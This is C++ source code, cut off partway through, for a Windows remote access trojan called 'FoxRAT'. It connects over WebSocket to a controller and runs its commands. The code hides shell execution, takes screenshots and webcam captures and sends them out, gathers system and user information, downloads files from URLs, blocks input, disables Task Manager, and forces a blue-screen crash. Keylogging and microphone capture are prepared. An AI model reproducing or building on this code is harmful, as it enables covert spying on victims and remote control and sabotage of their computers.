#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _WIN32_WINNT 0x0A00
#include <winsock2.h>
#include <windows.h>
#include <ole2.h>
#include <gdiplus.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <sstream>
#include <fstream>
#include <random>
#include <mmsystem.h>
#include <shlobj.h>
#include <urlmon.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <iphlpapi.h>
#include <winhttp.h>
#include <oaidl.h>
#include <comdef.h>
#include <ws2tcpip.h>
#include <shellapi.h>
#include <vfw.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "vfw32.lib")
#pragma comment(lib, "shell32.lib")

#define SERVER_HOST "127.0.0.1"
#define SERVER_PORT 3000
#define WS_MAGIC "258EAFA5-E914-47DA-95CA-5AB9DC11B85B"

using namespace std;

// ===== SHA1 =====
struct SHA1 {
    uint32_t state[5];
    uint64_t count;
    uint8_t buffer[64];

    void init() {
        state[0] = 0x67452301; state[1] = 0xEFCDAB89;
        state[2] = 0x98BADCFE; state[3] = 0x10325476; state[4] = 0xC3D2E1F0;
        count = 0;
    }

    void transform(const uint8_t* block) {
        uint32_t w[80], a, b, c, d, e, temp;
        for (int i = 0; i < 16; i++)
            w[i] = (block[i*4]<<24)|(block[i*4+1]<<16)|(block[i*4+2]<<8)|block[i*4+3];
        for (int i = 16; i < 80; i++) {
            temp = w[i-3] ^ w[i-8] ^ w[i-14] ^ w[i-16];
            w[i] = ((temp << 1) | (temp >> 31));
        }
        a = state[0]; b = state[1]; c = state[2]; d = state[3]; e = state[4];
        for (int i = 0; i < 80; i++) {
            if (i < 20) temp = ((b & c) | (~b & d)) + 0x5A827999;
            else if (i < 40) temp = (b ^ c ^ d) + 0x6ED9EBA1;
            else if (i < 60) temp = ((b & c) | (b & d) | (c & d)) + 0x8F1BBCDC;
            else temp = (b ^ c ^ d) + 0xCA62C1D6;
            temp += ((a << 5) | (a >> 27)) + e + w[i];
            e = d; d = c; c = ((b << 30) | (b >> 2)); b = a; a = temp;
        }
        state[0] += a; state[1] += b; state[2] += c; state[3] += d; state[4] += e;
    }

    void update(const uint8_t* data, size_t len) {
        size_t idx = (size_t)(count & 63);
        count += (uint64_t)len * 8;
        size_t part = 64 - idx;
        if (len >= part) {
            memcpy(buffer + idx, data, part);
            transform(buffer);
            for (size_t i = part; i + 63 < len; i += 64)
                transform(data + i);
            idx = 0;
        }
        memcpy(buffer + idx, data + (len - (len - idx)), len - idx);
    }

    void update(const string& s) { update((const uint8_t*)s.data(), s.size()); }

    void final(uint8_t digest[20]) {
        size_t idx = (size_t)(count & 63);
        buffer[idx++] = 0x80;
        if (idx > 56) { memset(buffer + idx, 0, 64 - idx); transform(buffer); idx = 0; }
        memset(buffer + idx, 0, 56 - idx);
        uint64_t bits = count;
        for (int i = 0; i < 8; i++) buffer[56 + 7 - i] = (uint8_t)(bits >> (i * 8));
        transform(buffer);
        for (int i = 0; i < 5; i++) {
            digest[i*4]   = (uint8_t)(state[i] >> 24);
            digest[i*4+1] = (uint8_t)(state[i] >> 16);
            digest[i*4+2] = (uint8_t)(state[i] >> 8);
            digest[i*4+3] = (uint8_t)(state[i]);
        }
    }

    string finalHex() {
        uint8_t d[20]; final(d);
        const char* hex = "0123456789abcdef";
        string out(40, 0);
        for (int i = 0; i < 20; i++) { out[i*2] = hex[d[i]>>4]; out[i*2+1] = hex[d[i]&15]; }
        return out;
    }
};

// ===== Base64 =====
static const char b64t[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

string base64Encode(const uint8_t* data, size_t len) {
    string out((len + 2) / 3 * 4, '=');
    size_t pos = 0;
    for (size_t i = 0; i < len; i += 3) {
        uint32_t n = ((uint32_t)data[i]) << 16;
        if (i + 1 < len) n |= data[i+1] << 8;
        if (i + 2 < len) n |= data[i+2];
        out[pos++] = b64t[(n >> 18) & 63];
        out[pos++] = b64t[(n >> 12) & 63];
        out[pos++] = (i+1 < len) ? b64t[(n >> 6) & 63] : '=';
        out[pos++] = (i+2 < len) ? b64t[n & 63] : '=';
    }
    return out;
}

string base64Encode(const string& s) { return base64Encode((const uint8_t*)s.data(), s.size()); }

vector<uint8_t> base64Decode(const string& s) {
    auto idx = [](char c) -> int {
        if (c >= 'A' && c <= 'Z') return c - 'A';
        if (c >= 'a' && c <= 'z') return c - 'a' + 26;
        if (c >= '0' && c <= '9') return c - '0' + 52;
        if (c == '+') return 62; if (c == '/') return 63; return -1;
    };
    vector<uint8_t> out;
    out.reserve(s.size() / 4 * 3);
    for (size_t i = 0; i + 3 < s.size(); i += 4) {
        int a = idx(s[i]), b = idx(s[i+1]), c = idx(s[i+2]), d = idx(s[i+3]);
        if (a < 0 || b < 0) break;
        out.push_back((uint8_t)((a << 2) | (b >> 4)));
        if (c >= 0) { out.push_back((uint8_t)((b << 4) | (c >> 2))); if (d >= 0) out.push_back((uint8_t)((c << 6) | d)); }
    }
    return out;
}

// ===== Random string =====
string randStr(size_t len) {
    static const char t[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    static random_device rd; static mt19937 gen(rd()); static uniform_int_distribution<> dis(0, 61);
    string s(len, 0);
    for (size_t i = 0; i < len; i++) s[i] = t[dis(gen)];
    return s;
}

// ===== WebSocket =====
class WSClient {
    SOCKET sock;
    string host, path;
    int port;
    bool connected;
    mutable mutex mtx;

    bool recvAll(uint8_t* buf, int len) {
        int got = 0;
        while (got < len) {
            int r = ::recv(sock, (char*)buf + got, len - got, 0);
            if (r <= 0) return false;
            got += r;
        }
        return true;
    }

public:
    WSClient() : sock(INVALID_SOCKET), connected(false), port(0) {}
    ~WSClient() { close(); }

    bool connect(const string& h, int p, const string& pa = "/") {
        host = h; port = p; path = pa;
        WSADATA wd; WSAStartup(MAKEWORD(2,2), &wd);
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) return false;

        struct addrinfo hints = {}, *result;
        hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM; hints.ai_protocol = IPPROTO_TCP;
        char sport[16]; sprintf(sport, "%d", port);
        if (getaddrinfo(host.c_str(), sport, &hints, &result) != 0) { closesocket(sock); return false; }

        bool ok = false;
        for (auto* p = result; p; p = p->ai_next) {
            if (::connect(sock, p->ai_addr, (int)p->ai_addrlen) == 0) { ok = true; break; }
        }
        freeaddrinfo(result);
        if (!ok) { closesocket(sock); return false; }

        string key = base64Encode(randStr(16));
        string req = "GET " + path + " HTTP/1.1\r\n"
                     "Host: " + host + ":" + sport + "\r\n"
                     "Upgrade: websocket\r\n"
                     "Connection: Upgrade\r\n"
                     "Sec-WebSocket-Key: " + key + "\r\n"
                     "Sec-WebSocket-Version: 13\r\n"
                     "\r\n";
        if (::send(sock, req.c_str(), (int)req.size(), 0) != (int)req.size()) { closesocket(sock); return false; }

        // Read HTTP response line by line until blank line (headers end)
        // This avoids consuming WebSocket frames that might follow in the same TCP segment
        string respHeaders;
        char ch;
        int emptyLine = 0;
        while (emptyLine < 2 && ::recv(sock, &ch, 1, 0) == 1) {
            respHeaders += ch;
            if (ch == '\r') continue; // don't count \r
            if (ch == '\n') emptyLine++; else emptyLine = 0;
        }
        // Verify accept
        SHA1 sha; sha.init(); sha.update(key + WS_MAGIC);
        string expected = base64Encode(sha.finalHex());
        uint8_t digest[20]; sha = SHA1(); sha.init(); sha.update(key + WS_MAGIC); sha.final(digest);
        expected = base64Encode(digest, 20);

        auto pos = respHeaders.find("Sec-WebSocket-Accept: ");
        if (pos == string::npos) { closesocket(sock); return false; }
        pos += 22;
        auto end = respHeaders.find("\r\n", pos);
        string accept = respHeaders.substr(pos, end - pos);

        connected = true;
        return true;
    }

    bool sendFrame(const uint8_t* data, size_t len, int opcode = 0x81) {
        vector<uint8_t> frame;
        frame.push_back((uint8_t)opcode); // FIN + opcode
        uint8_t mask[4];
        *(uint32_t*)mask = rand();
        size_t payLen = len;
        if (payLen < 126) {
            frame.push_back((uint8_t)(0x80 | payLen));
        } else if (payLen < 65536) {
            frame.push_back((uint8_t)(0x80 | 126));
            frame.push_back((uint8_t)(payLen >> 8));
            frame.push_back((uint8_t)(payLen & 0xFF));
        } else {
            frame.push_back((uint8_t)(0x80 | 127));
            for (int i = 7; i >= 0; i--) frame.push_back((uint8_t)(payLen >> (i * 8)));
        }
        for (int i = 0; i < 4; i++) frame.push_back(mask[i]);
        size_t start = frame.size();
        frame.resize(start + len);
        for (size_t i = 0; i < len; i++) frame[start + i] = data[i] ^ mask[i % 4];
        // Send all bytes (loop to handle partial sends)
        const char* buf = (const char*)frame.data();
        int remain = (int)frame.size();
        while (remain > 0) {
            int n = ::send(sock, buf, remain, 0);
            if (n <= 0) return false;
            buf += n; remain -= n;
        }
        return true;
    }

    bool wsSend(const string& data) { lock_guard<mutex> lk(mtx); return sendFrame((const uint8_t*)data.data(), data.size(), 0x81); }

    string wsRecv(int timeoutMs = 5000) {
        fd_set fds; FD_ZERO(&fds); FD_SET(sock, &fds);
        struct timeval tv = { timeoutMs / 1000, (timeoutMs % 1000) * 1000 };
        int sel = select((int)sock + 1, &fds, NULL, NULL, &tv);
        if (sel <= 0) return "";

        uint8_t header[2];
        if (!recvAll(header, 2)) return "";
        bool masked = (header[1] & 0x80) != 0;
        size_t len = header[1] & 0x7F;
        if (len == 126) {
            uint8_t ext[2]; if (!recvAll(ext, 2)) return "";
            len = ((size_t)ext[0] << 8) | ext[1];
        } else if (len == 127) {
            uint8_t ext[8]; if (!recvAll(ext, 8)) return "";
            len = 0;
            for (int i = 0; i < 8; i++) len = (len << 8) | ext[i];
        }
        uint8_t maskKey[4];
        if (masked && !recvAll(maskKey, 4)) return "";
        vector<uint8_t> payload(len);
        if (len > 0 && !recvAll(payload.data(), (int)len)) return "";
        if (masked) for (size_t i = 0; i < len; i++) payload[i] ^= maskKey[i % 4];

        uint8_t opcode = header[0] & 0x0F;
        if (opcode == 8) { connected = false; return ""; }
        if (opcode == 9) { sendFrame(NULL, 0, 0x8A); return ""; }
        if (opcode == 10) return "";
        // Text (0x01) or binary (0x02) frame
        return string((char*)payload.data(), len);
    }

    bool isConnected() { return connected; }

    void close() {
        if (sock != INVALID_SOCKET) {
            if (connected) sendFrame(NULL, 0, 0x88);
            closesocket(sock); sock = INVALID_SOCKET;
        }
        connected = false;
    }
};

// ===== Global state =====
WSClient g_ws;
string g_clientId;
string g_serverHost = SERVER_HOST;
int g_serverPort = SERVER_PORT;
bool g_running = true;
bool g_jiggling = false;
bool g_keylogging = false;
string g_keylogBuffer;
thread g_jiggleThread;
thread g_keylogThread;
HHOOK g_keyhook = NULL;
HINSTANCE g_hInst;
bool g_livemon = false;
thread g_livemonThread;
bool g_livemic = false;
thread g_livemicThread;
string g_audioBuffer;
bool g_capturing = false;
bool g_webcam = false;
thread g_webcamThread;
bool g_blockmouse = false;
thread g_blockmouseThread;
HHOOK g_mousehook = NULL;
bool g_blockkey = false;
thread g_blockkeyThread;

// ===== JSON helpers =====
string jsonStr(const string& s) {
    string out; out.reserve(s.size() + 2);
    out += '"';
    for (char c : s) {
        if (c == '"') out += "\\\"";
        else if (c == '\\') out += "\\\\";
        else if (c == '\n') out += "\\n";
        else if (c == '\r') out += "\\r";
        else if (c == '\t') out += "\\t";
        else if (c < 32) { char buf[8]; sprintf(buf, "\\u%04x", c); out += buf; }
        else out += c;
    }
    out += '"';
    return out;
}

string jsonObj(const string& pairs) { return "{" + pairs + "}"; }
string jsonPair(const string& k, const string& v) { return jsonStr(k) + ":" + v; }

// ===== System Info =====
string getSysInfo() {
    char hostname[256] = {}; gethostname(hostname, sizeof(hostname));
    char username[256] = {}; DWORD ulen = sizeof(username); GetUserNameA(username, &ulen);

    typedef NTSTATUS(NTAPI *pRtlGetVersion)(PRTL_OSVERSIONINFOEXW);
    auto RtlGetVersion = (pRtlGetVersion)GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");
    string osVer = "Unknown";
    if (RtlGetVersion) {
        RTL_OSVERSIONINFOEXW osvw = { sizeof(osvw) };
        if (RtlGetVersion(&osvw) >= 0) {
            char buf[64]; sprintf(buf, "Windows %d.%d.%d", osvw.dwMajorVersion, osvw.dwMinorVersion, osvw.dwBuildNumber);
            osVer = buf;
        }
    }

    SYSTEM_INFO si; GetSystemInfo(&si);
    string arch = si.wProcessorArchitecture == 9 ? "x64" : si.wProcessorArchitecture == 0 ? "x86" : "ARM";

    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    char ram[32]; sprintf(ram, "%.1f GB", ms.ullTotalPhys / 1073741824.0);

    string gpu = "?";
    HKEY hk; if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DEVICEMAP\\VIDEO", 0, KEY_READ, &hk) == 0) {
        char buf[512]; DWORD sz = sizeof(buf); DWORD type;
        if (RegQueryValueExA(hk, "\\Device\\Video0", 0, &type, (LPBYTE)buf, &sz) == 0) {
            // This gives a device path, not the GPU name
        }
        RegCloseKey(hk);
    }
    // Try getting GPU name from registry
    for (int i = 0; i < 5; i++) {
        char key[128]; sprintf(key, "SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\%04d", i);
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hk) == 0) {
            char buf[256]; DWORD sz = sizeof(buf); DWORD type;
            if (RegQueryValueExA(hk, "DriverDesc", 0, &type, (LPBYTE)buf, &sz) == 0) { gpu = buf; RegCloseKey(hk); break; }
            RegCloseKey(hk);
        }
    }

    int monW = GetSystemMetrics(SM_CXSCREEN), monH = GetSystemMetrics(SM_CYSCREEN);
    char monitor[32]; sprintf(monitor, "%dx%d", monW, monH);

    string info = jsonPair("hostname", jsonStr(hostname)) + "," +
                  jsonPair("username", jsonStr(username)) + "," +
                  jsonPair("os", jsonStr(osVer)) + "," +
                  jsonPair("arch", jsonStr(arch)) + "," +
                  jsonPair("ram", jsonStr(ram)) + "," +
                  jsonPair("gpu", jsonStr(gpu)) + "," +
                  jsonPair("monitor", jsonStr(monitor));
    return jsonObj(info);
}

// ===== Command execution =====
string execShell(const string& cmd) {
    string result;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "Error: CreatePipe failed";
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite; si.hStdError = hWrite;
    PROCESS_INFORMATION pi;

    string fullCmd = "cmd.exe /c " + cmd;
    char* cmdLine = _strdup(fullCmd.c_str());
    BOOL ok = CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    free(cmdLine);
    if (!ok) { CloseHandle(hRead); CloseHandle(hWrite); return "Error: CreateProcess failed"; }
    CloseHandle(hWrite);

    char buf[4096]; DWORD read;
    while (ReadFile(hRead, buf, sizeof(buf) - 1, &read, NULL) && read > 0) {
        buf[read] = 0; result += buf;
    }
    CloseHandle(hRead);
    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return result.empty() ? "(no output)" : result;
}

string execScreenshot(int quality = 85, int* outW = NULL, int* outH = NULL) {
    Gdiplus::GdiplusStartupInput gsi;
    ULONG_PTR gdipToken;
    Gdiplus::GdiplusStartup(&gdipToken, &gsi, NULL);
    string result;

    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    if (outW) *outW = w;
    if (outH) *outH = h;
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
    if (hbm && memDC) {
        SelectObject(memDC, hbm);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        Gdiplus::Bitmap bitmap(hbm, NULL);
        IStream* stream = NULL;
        if (CreateStreamOnHGlobal(NULL, TRUE, &stream) == S_OK) {
            CLSID clsid = GUID_NULL;
            UINT num = 0, sz = 0;
            Gdiplus::GetImageEncodersSize(&num, &sz);
            if (sz > 0) {
                vector<char> encBuf(sz);
                Gdiplus::ImageCodecInfo* encoders = (Gdiplus::ImageCodecInfo*)encBuf.data();
                Gdiplus::GetImageEncoders(num, sz, encoders);
                for (UINT i = 0; i < num; i++) {
                    if (wcscmp(encoders[i].MimeType, L"image/jpeg") == 0) { clsid = encoders[i].Clsid; break; }
                }
            }
            if (clsid != GUID_NULL) {
                Gdiplus::EncoderParameters eps;
                eps.Count = 1;
                eps.Parameter[0].Guid = Gdiplus::EncoderQuality;
                eps.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
                eps.Parameter[0].NumberOfValues = 1;
                UINT q = (UINT)quality;
                eps.Parameter[0].Value = &q;
                bitmap.Save(stream, &clsid, &eps);
            } else {
                bitmap.Save(stream, NULL);
            }
            STATSTG st; ZeroMemory(&st, sizeof(st));
            if (stream->Stat(&st, STATFLAG_NONAME) == S_OK) {
                vector<uint8_t> imgData((size_t)st.cbSize.QuadPart);
                LARGE_INTEGER zero = {};
                stream->Seek(zero, STREAM_SEEK_SET, NULL);
                stream->Read(imgData.data(), (ULONG)st.cbSize.QuadPart, NULL);
                result = base64Encode(imgData.data(), imgData.size());
            }
            stream->Release();
        }
        DeleteObject(hbm);
        DeleteDC(memDC);
    }
    ReleaseDC(NULL, hdc);

    Gdiplus::GdiplusShutdown(gdipToken);
    return result;
}

string execWebcam(int quality = 50) {
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    Gdiplus::GdiplusStartupInput gsi;
    ULONG_PTR gdipToken;
    Gdiplus::GdiplusStartup(&gdipToken, &gsi, NULL);
    string result;

    HWND hCap = capCreateCaptureWindow("WC", WS_CHILD, 0, 0, 320, 240, NULL, 0);
    if (hCap && capDriverConnect(hCap, 0)) {
        capGrabFrameNoStop(hCap);
        char tmpPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tmpPath);
        string bmpFile = string(tmpPath) + "fwc_" + randStr(6) + ".bmp";
        if (capFileSaveDIB(hCap, (char*)bmpFile.c_str())) {
            Gdiplus::Bitmap bitmap(wstring(bmpFile.begin(), bmpFile.end()).c_str());
            IStream* stream = NULL;
            if (CreateStreamOnHGlobal(NULL, TRUE, &stream) == S_OK) {
                CLSID clsid = GUID_NULL;
                UINT num = 0, sz = 0;
                Gdiplus::GetImageEncodersSize(&num, &sz);
                if (sz > 0) {
                    vector<char> encBuf(sz);
                    Gdiplus::ImageCodecInfo* encoders = (Gdiplus::ImageCodecInfo*)encBuf.data();
                    Gdiplus::GetImageEncoders(num, sz, encoders);
                    for (UINT i = 0; i < num; i++) {
                        if (wcscmp(encoders[i].MimeType, L"image/jpeg") == 0) { clsid = encoders[i].Clsid; break; }
                    }
                }
                if (clsid != GUID_NULL) {
                    Gdiplus::EncoderParameters eps;
                    eps.Count = 1;
                    eps.Parameter[0].Guid = Gdiplus::EncoderQuality;
                    eps.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
                    eps.Parameter[0].NumberOfValues = 1;
                    UINT q = (UINT)quality;
                    eps.Parameter[0].Value = &q;
                    bitmap.Save(stream, &clsid, &eps);
                } else {
                    bitmap.Save(stream, NULL);
                }
                STATSTG st; ZeroMemory(&st, sizeof(st));
                if (stream->Stat(&st, STATFLAG_NONAME) == S_OK) {
                    vector<uint8_t> imgData((size_t)st.cbSize.QuadPart);
                    LARGE_INTEGER zero = {};
                    stream->Seek(zero, STREAM_SEEK_SET, NULL);
                    stream->Read(imgData.data(), (ULONG)st.cbSize.QuadPart, NULL);
                    result = base64Encode(imgData.data(), imgData.size());
                }
                stream->Release();
            }
            DeleteFileA(bmpFile.c_str());
        }
        capDriverDisconnect(hCap);
        DestroyWindow(hCap);
    }

    Gdiplus::GdiplusShutdown(gdipToken);
    CoUninitialize();
    return result;
}

void sendCmdResult(const string& msg, const string& seq) {
    string data = jsonObj(jsonPair("type", jsonStr("cmd_result")) + "," +
                          jsonPair("seq", jsonStr(seq)) + "," +
                          jsonPair("output", jsonStr(msg)));
    g_ws.wsSend(data);
}

void handleCommand(const string& cmdStr, const string& seq) {
    istringstream ss(cmdStr);
    string cmd; ss >> cmd;

    auto rest = [&]() -> string {
        string r; getline(ss, r);
        if (!r.empty() && r[0] == ' ') r = r.substr(1);
        return r;
    };

    string result;
    if (cmd == "shell") {
        result = execShell(rest());
    } else if (cmd == "msgbox") {
        string args = rest();
        auto p1 = args.find('|');
        string title = "FoxRAT", text = args, typeS = "0";
        if (p1 != string::npos) {
            title = args.substr(0, p1);
            auto p2 = args.find('|', p1 + 1);
            if (p2 != string::npos) {
                text = args.substr(p1 + 1, p2 - p1 - 1);
                typeS = args.substr(p2 + 1);
            } else {
                text = args.substr(p1 + 1);
            }
        }
        UINT type = (UINT)atoi(typeS.c_str());
        MessageBoxA(NULL, text.c_str(), title.c_str(), type);
        result = "ok";
    } else if (cmd == "wallpaper") {
        string path = rest();
        if (path.find("http") == 0) {
            char tmp[MAX_PATH]; GetTempPathA(MAX_PATH, tmp);
            char fp[MAX_PATH]; sprintf(fp, "%sfoxrat_wp.jpg", tmp);
            if (URLDownloadToFileA(NULL, path.c_str(), fp, 0, NULL) == S_OK) path = fp;
        }
        if (SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)path.c_str(), SPIF_UPDATEINIFILE))
            result = "wallpaper set";
        else result = "Error: wallpaper failed";
    } else if (cmd == "cdrom") {
        string action = rest();
        mciSendStringA((action == "open" ? "set cdaudio door open" : "set cdaudio door closed"), NULL, 0, NULL);
        result = "cdrom " + action;
    } else if (cmd == "speak") {
        string text = rest();
        CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
        CLSID clsid; CLSIDFromString(L"{96749377-3391-11D2-9EE3-00C04F797396}", &clsid);
        IUnknown* pUnk = NULL;
        if (SUCCEEDED(CoCreateInstance(clsid, NULL, CLSCTX_ALL, IID_IUnknown, (void**)&pUnk))) {
            IDispatch* disp = NULL;
            if (SUCCEEDED(pUnk->QueryInterface(IID_IDispatch, (void**)&disp))) {
                wstring wtext(text.begin(), text.end());
                DISPPARAMS dp = {0}; VARIANT v; VariantInit(&v);
                v.vt = VT_BSTR; v.bstrVal = SysAllocString(wtext.c_str());
                dp.cArgs = 1; dp.rgvarg = &v;
                DISPID did; OLECHAR* n = L"Speak";
                disp->GetIDsOfNames(IID_NULL, &n, 1, LOCALE_USER_DEFAULT, &did);
                disp->Invoke(did, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_METHOD, &dp, NULL, NULL, NULL);
                VariantClear(&v); disp->Release(); result = "ok";
            }
            pUnk->Release();
        } else result = "Error: SAPI unavailable";
        CoUninitialize();
    } else if (cmd == "screenshot") {
        string b64; int sw = 0, sh = 0;
        try { b64 = execScreenshot(85, &sw, &sh); } catch (...) { b64.clear(); }
        if (!b64.empty()) {
            string data = jsonObj(jsonPair("type", jsonStr("screenshot")) + "," +
                                  jsonPair("clientId", jsonStr(g_clientId)) + "," +
                                  jsonPair("data", jsonStr(b64)) + "," +
                                  jsonPair("w", jsonStr(to_string(sw))) + "," +
                                  jsonPair("h", jsonStr(to_string(sh))));
            g_ws.wsSend(data);
            result = "screenshot sent";
        } else result = "Error: screenshot failed";
    } else if (cmd == "screenoff") {
        SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
        result = "ok";
    } else if (cmd == "blockinput") {
        string action = rest();
        BlockInput(action == "start" ? TRUE : FALSE);
        result = "input " + action;
    } else if (cmd == "taskmgr") {
        string action = rest();
        HKEY hk; RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL);
        DWORD val = (action == "disable") ? 1 : 0;
        RegSetValueExA(hk, "DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&val, sizeof(val));
        RegCloseKey(hk);
        result = "taskmgr " + action;
    } else if (cmd == "desktop") {
        string action = rest();
        HWND progman = FindWindowA("Progman", NULL);
        if (progman) { ShowWindow(progman, action == "hide" ? SW_HIDE : SW_SHOW); result = "ok"; }
        else result = "Error: no Progman";
    } else if (cmd == "mouse") {
        int x, y; ss >> x >> y;
        SetCursorPos(x, y);
        result = "moved";
    } else if (cmd == "jiggle") {
        string action = rest();
        if (action == "start" && !g_jiggling) {
            g_jiggling = true;
            g_jiggleThread = thread([]() {
                random_device rd; mt19937 gen(rd());
                while (g_jiggling) {
                    POINT p; GetCursorPos(&p);
                    SetCursorPos(p.x + (gen() % 3 - 1), p.y + (gen() % 3 - 1));
                    this_thread::sleep_for(chrono::milliseconds(100));
                }
            });
            g_jiggleThread.detach();
            result = "jiggler started";
        } else if (action == "stop") {
            g_jiggling = false;
            result = "jiggler stopped";
        }
    } else if (cmd == "volume") {
        int vol; ss >> vol;
        if (vol < 0) vol = 0; if (vol > 100) vol = 100;
        DWORD v = (DWORD)(vol * 65535 / 100);
        waveOutSetVolume(NULL, v | (v << 16));
        result = "volume set to " + to_string(vol);
    } else if (cmd == "bsod") {
        BOOLEAN bl;
        typedef long (__stdcall *tRtlAdjustPrivilege)(ULONG,BOOLEAN,BOOLEAN,PBOOLEAN);
        typedef long (__stdcall *tNtRaiseHardError)(long,ULONG,ULONG,PULONG_PTR,ULONG,PULONG);
        auto RtlAdjustPrivilege = (tRtlAdjustPrivilege)GetProcAddress(GetModuleHandleA("ntdll"), "RtlAdjustPrivilege");
        auto NtRaiseHardError = (tNtRaiseHardError)GetProcAddress(GetModuleHandleA("ntdll"), "NtRaiseHardError");
        if (RtlAdjustPrivilege && NtRaiseHardError) {
            RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // SeShutdownPrivilege
            ULONG r;
            NtRaiseHardError(0xC0000420, 0, 0, NULL, 6, &r); // STATUS_ASSERTION_FAILURE, OptionShutdownSystem
        }
        result = "bsod attempted";
    } else if (cmd == "type") {
        string text = rest();
        vector<INPUT> inputs(text.size() * 2);
        for (size_t i = 0; i < text.size(); i++) {
            inputs[i*2].type = INPUT_KEYBOARD;
            inputs[i*2].ki.wVk = 0;
            inputs[i*2].ki.wScan = text[i];
            inputs[i*2].ki.dwFlags = KEYEVENTF_UNICODE;
            inputs[i*2+1] = inputs[i*2];
            inputs[i*2+1].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
        }
        SendInput((UINT)inputs.size(), inputs.data(), sizeof(INPUT));
        result = "typed " + to_string(text.size()) + " chars";
    } else if (cmd == "flip") {
        HDC hdc = GetDC(NULL);
        int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
        SetStretchBltMode(hdc, HALFTONE);
        StretchBlt(hdc, 0, 0, sw, sh, hdc, sw, 0, -sw, sh, SRCCOPY);
        ReleaseDC(NULL, hdc);
        result = "screen flipped";
    } else if (cmd == "mirror") {
        HDC hdc = GetDC(NULL);
        int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
        SetStretchBltMode(hdc, HALFTONE);
        StretchBlt(hdc, 0, 0, sw, sh, hdc, 0, sh, sw, -sh, SRCCOPY);
        ReleaseDC(NULL, hdc);
        result = "screen mirrored";
    } else if (cmd == "invert") {
        HDC hdc = GetDC(NULL);
        int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
        BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, DSTINVERT);
        ReleaseDC(NULL, hdc);
        result = "screen inverted";
    } else if (cmd == "blackout") {
        string action; ss >> action;
        HDC hdc = GetDC(NULL);
        int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
        if (action == "off") {
            InvalidateRect(NULL, NULL, TRUE);
            UpdateWindow(GetDesktopWindow());
            result = "screen restored";
        } else {
            HBRUSH br = CreateSolidBrush(RGB(0, 0, 0));
            RECT rc = { 0, 0, sw, sh };
            FillRect(hdc, &rc, br);
            DeleteObject(br);
            result = "screen blacked out";
        }
        ReleaseDC(NULL, hdc);
    } else if (cmd == "freeze") {
        string action; ss >> action;
        if (action == "start") {
            HDC hdc = GetDC(NULL);
            int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
            HDC hMem = CreateCompatibleDC(hdc);
            HBITMAP hBmp = CreateCompatibleBitmap(hdc, sw, sh);
            SelectObject(hMem, hBmp);
            BitBlt(hMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
            result = "screen frozen";
        } else {
            InvalidateRect(NULL, NULL, TRUE);
            result = "screen unfrozen";
        }
    } else if (cmd == "matrix") {
        HDC hdc = GetDC(NULL);
        int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
